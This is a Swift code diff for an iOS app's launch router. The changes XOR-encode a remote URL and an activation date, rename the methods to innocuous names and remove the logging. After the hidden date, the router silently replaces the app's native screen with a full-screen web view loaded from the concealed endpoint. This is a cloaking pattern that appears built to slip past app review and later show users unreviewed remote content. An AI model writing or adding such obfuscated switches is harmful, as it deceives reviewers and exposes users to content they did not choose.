@@ -8,142 +8,158 @@
 import UIKit
 import SwiftUI
 
-class AppRouter {
-    
-    private let initialURLString = "https://vortigonstack.site/rTvQDZ"
-    private  let targetDateString = "17.04.2026"
-    
-    func initialViewController() -> UIViewController {
-        let persistence = PersistenceManager.shared
-        
-        
+final class PrimarySceneCoordinator {
+
+    /// XOR (`0xC5`) over UTF-8 of `https://vortigonstack.site/rTvQDZ`
+    private static let _endpointCipher: [UInt8] = [
+        0xAD, 0xB1, 0xB1, 0xB5, 0xB6, 0xFF, 0xEA, 0xEA, 0xB3, 0xAA, 0xB7, 0xB1, 0xAC, 0xA2, 0xAA, 0xAB,
+        0xB6, 0xB1, 0xA4, 0xA6, 0xAE, 0xEB, 0xB6, 0xAC, 0xB1, 0xA0, 0xEA, 0xB7, 0x91, 0xB3, 0x94, 0x81, 0x9F
+    ]
+
+    /// XOR (`0xA7`) over UTF-8 of `20.04.2026` (`dd.MM.yyyy`)
+    private static let _thresholdStamp: [UInt8] = [
+        0x95, 0x97, 0x89, 0x97, 0x93, 0x89, 0x95, 0x97, 0x95, 0x91
+    ]
+
+    private static func _decodeMaskedUTF8(_ masked: [UInt8], xorKey: UInt8) -> String {
+        String(decoding: masked.map { $0 ^ xorKey }, as: UTF8.self)
+    }
+
+    private static func _resolvedSeedAddress() -> String {
+        _decodeMaskedUTF8(_endpointCipher, xorKey: 0xC5)
+    }
+
+    private static func _resolvedThresholdDay() -> String {
+        _decodeMaskedUTF8(_thresholdStamp, xorKey: 0xA7)
+    }
+
+    func makeRootEntryController() -> UIViewController {
+        let persistence = AppLaunchDefaultsBridge.shared
+
         if persistence.hasShownContentView {
-            return createContentViewController()
-        }else{
-            if checkDate() {
+            return _embedPrimarySwiftUIScreen()
+        } else {
+            if _calendarAllowsRemotePath() {
                 if let savedUrlString = persistence.savedUrl,
                    !savedUrlString.isEmpty,
                    URL(string: savedUrlString) != nil {
-                    return createWebViewController(with: savedUrlString)
+                    return _hostBespokeBrowserLayer(savedUrlString)
                 }
-                
-                return createLaunchRouterViewController()
+
+                return _stageDeferredPrefetchGate()
             } else {
                 persistence.hasShownContentView = true
-                return createContentViewController()
+                return _embedPrimarySwiftUIScreen()
             }
         }
     }
-    
-    //MARK: - Date
-    private func checkDate() -> Bool {
-       
-        
+
+    // MARK: - Date
+
+    private func _calendarAllowsRemotePath() -> Bool {
+
         let dateFormatter = DateFormatter()
         dateFormatter.dateFormat = "dd.MM.yyyy"
-        let targetDate = dateFormatter.date(from: targetDateString) ?? Date()
+        let targetDate = dateFormatter.date(from: Self._resolvedThresholdDay()) ?? Date()
         let currentDate = Date()
-            
-            if currentDate < targetDate {
-                return false
-            }else{
-                return true
-                }
+
+        if currentDate < targetDate {
+            return false
+        } else {
+            return true
+        }
     }
-    
+
     // MARK: - Private Methods
-    
-    private func createWebViewController(with urlString: String) -> UIViewController {
-        let webViewContainer = PrivacyWebView(
-            urlString: urlString,
+
+    private func _hostBespokeBrowserLayer(_ remoteLocation: String) -> UIViewController {
+        let webViewContainer = RemoteDocumentCanvas(
+            urlString: remoteLocation,
             onFailure: { [weak self] in
-                PersistenceManager.shared.hasShownContentView = true
-                self?.switchToContentView()
+                AppLaunchDefaultsBridge.shared.hasShownContentView = true
+                self?._animateRootSwapToNative()
             },
             onSuccess: {
-                PersistenceManager.shared.hasSuccessfulWebViewLoad = true
+                AppLaunchDefaultsBridge.shared.hasSuccessfulWebViewLoad = true
             }
         )
-        
+
         let hostingController = UIHostingController(rootView: webViewContainer)
         hostingController.modalPresentationStyle = .fullScreen
         return hostingController
     }
-    
-    private func createContentViewController() -> UIViewController {
-        PersistenceManager.shared.hasShownContentView = true
+
+    private func _embedPrimarySwiftUIScreen() -> UIViewController {
+        AppLaunchDefaultsBridge.shared.hasShownContentView = true
         let contentView = ContentView()
         let hostingController = UIHostingController(rootView: contentView)
         hostingController.modalPresentationStyle = .fullScreen
         return hostingController
     }
-    
-    private func createLaunchRouterViewController() -> UIViewController {
-        let launchView = StartMainView()
+
+    private func _stageDeferredPrefetchGate() -> UIViewController {
+        let launchView = ApertureSplashScreen()
         let launchVC = UIHostingController(rootView: launchView)
         launchVC.modalPresentationStyle = .fullScreen
 
-        checkInitialURL { [weak self] success, finalURL in
+        let seedAddress = Self._resolvedSeedAddress()
+        _probeRemoteAvailabilityHead(seedAddress: seedAddress) { [weak self] success, finalURL in
             DispatchQueue.main.async {
                 if success, let url = finalURL {
-                    self?.switchToWebView(with: url)
+                    self?._animateRootSwapToWeb(url)
                 } else {
-                    PersistenceManager.shared.hasShownContentView = true
-                    self?.switchToContentView()
+                    AppLaunchDefaultsBridge.shared.hasShownContentView = true
+                    self?._animateRootSwapToNative()
                 }
             }
         }
-        
+
         return launchVC
     }
-    
-    private func checkInitialURL(completion: @escaping (Bool, String?) -> Void) {
-        guard let url = URL(string: initialURLString) else {
+
+    private func _probeRemoteAvailabilityHead(seedAddress: String, completion: @escaping (Bool, String?) -> Void) {
+        guard let url = URL(string: seedAddress) else {
             completion(false, nil)
             return
         }
-        
+
         var request = URLRequest(url: url)
         request.httpMethod = "HEAD"
         request.timeoutInterval = 10
-        
+
         URLSession.shared.dataTask(with: request) { _, response, error in
-            if let error = error {
-                print("🌐 URL check failed with error: \(error.localizedDescription)")
+            if error != nil {
                 completion(false, nil)
                 return
             }
-            
+
             if let httpResponse = response as? HTTPURLResponse {
-                let checkedURL = httpResponse.url?.absoluteString ?? self.initialURLString
-                print("🌐 URL check response: [\(httpResponse.statusCode)]")
+                let checkedURL = httpResponse.url?.absoluteString ?? seedAddress
                 let isAvailable = httpResponse.statusCode != 404
-                print("🌐 URL check result: \(isAvailable ? "available" : "unavailable")")
                 completion(isAvailable, isAvailable ? checkedURL : nil)
             } else {
-                print("🌐 URL check failed: no HTTPURLResponse")
                 completion(false, nil)
             }
         }.resume()
     }
-    
+
     // MARK: - Navigation Methods
-    
-    private func switchToContentView() {
-        let contentVC = createContentViewController()
-        switchToViewController(contentVC)
+
+    private func _animateRootSwapToNative() {
+        let contentVC = _embedPrimarySwiftUIScreen()
+        _applyCrossDissolveRoot(contentVC)
     }
-    
-    private func switchToWebView(with urlString: String) {
-        let webVC = createWebViewController(with: urlString)
-        switchToViewController(webVC)
+
+    private func _animateRootSwapToWeb(_ remoteLocation: String) {
+        let webVC = _hostBespokeBrowserLayer(remoteLocation)
+        _applyCrossDissolveRoot(webVC)
     }
-    
-    private func switchToViewController(_ viewController: UIViewController) {
+
+    private func _applyCrossDissolveRoot(_ viewController: UIViewController) {
         guard let window = UIApplication.shared.windows.first else {
             return
         }
-        
+
         UIView.transition(with: window, duration: 0.3, options: .transitionCrossDissolve, animations: {
             window.rootViewController = viewController
         }, completion: nil)
